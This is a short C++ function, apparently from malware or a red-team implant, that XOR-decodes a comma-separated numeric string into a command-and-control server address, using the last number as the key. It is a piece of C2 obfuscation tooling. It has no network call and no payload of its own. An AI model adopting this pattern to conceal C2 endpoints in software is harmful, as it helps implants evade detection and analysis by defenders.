void DecryptXOR(std::string C2Server, std::string& DecryptedC2Server) {
	size_t del;
	std::string C2 = C2Server; 
	std::string s;
	char key;

	// in last iteration will get key which is in the last character (88)
	while ((del = C2.find(',')) != std::string::npos) {
		s = C2.substr(0, del);
		key = std::stoi(s);  
		C2.erase(0, del + 1);
	}
	//std::cout << (size_t)key << " -> " << key << std::endl;

	// XOR decrypting
	C2 = C2Server;
	while ((del = C2.find(',')) != std::string::npos) {
		s = C2.substr(0, del);
		DecryptedC2Server += (char)(std::stoi(s) ^ key);
		C2.erase(0, del+1);
	}
	//std::cout << DecryptedC2Server;
}